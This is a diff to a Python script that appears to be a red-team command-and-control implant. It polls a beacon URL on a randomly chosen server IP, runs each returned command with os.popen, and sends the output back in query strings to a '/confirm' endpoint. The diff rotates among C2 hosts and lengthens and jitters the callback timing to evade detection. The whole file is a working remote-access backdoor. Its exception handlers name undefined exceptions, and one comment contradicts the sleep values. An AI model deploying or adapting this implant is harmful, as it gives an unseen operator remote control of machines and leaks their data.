@@ -1,6 +1,30 @@
 #!/usr/bin/python3
-import os, requests, time, socket, json, random, sys
+import os, requests, time, socket, json, random, sys, random
 
+'''ips = [
+		'192.168.5.147',
+		'192.168.5.152',
+		'192.168.5.164',
+		'192.168.5.183',
+		'192.168.5.196',
+		'192.168.5.197',
+		'192.168.5.3',
+		'192.168.5.31',
+		'192.168.5.33',
+		'192.168.5.79',
+		'192.168.5.94',
+		'192.168.6.103',
+		'192.168.6.141',
+		'192.168.6.151',
+		'192.168.6.161',
+		'192.168.6.192',
+		'192.168.6.193',
+		'192.168.6.211',
+		'192.168.6.6',
+		'192.168.6.82'
+]'''
+
+ips=['127.0.0.1']
 
 """
 Function: getIP
@@ -33,12 +57,14 @@ def beacon():
 	while True:
 		cmds = {}
 		ip = getIP()
+		arkIP = random.choice(ips)
+		print(arkIP)
 		#random offset to vary beacon timing
-		offset = random.randrange(-7,7)
+		offset = random.randrange(-10,10)
 
 		#commands from server to run
 		try:
-			commands = requests.get('http://192.168.7.222/beacon?ip={}'.format(ip))
+			commands = requests.get('http://{}/beacon?ip={}'.format(arkIP, ip))
 		except expression as E:
 			pass
 		
@@ -54,14 +80,14 @@ def beacon():
 				cmds[cmd] = os.popen(cmd).read()
 				#send confirmation of command being run
 				try:
-					requests.get('http://192.168.7.222/confirm?ip={}&cmd={}&output={}'.format(ip, cmd, cmds[cmd])) 
+					requests.get('http://{}/confirm?ip={}&cmd={}&output={}'.format(arkIP, ip, cmd, cmds[cmd])) 
 				except exppression as E:
 					pass
 			#print commands
 			#print(cmds)
 			#TODO send command respone to server
 		#wait 3 to 17 seconds to callback
-		time.sleep(10 + offset)
+		time.sleep(45 + offset)
 
 
 beacon()
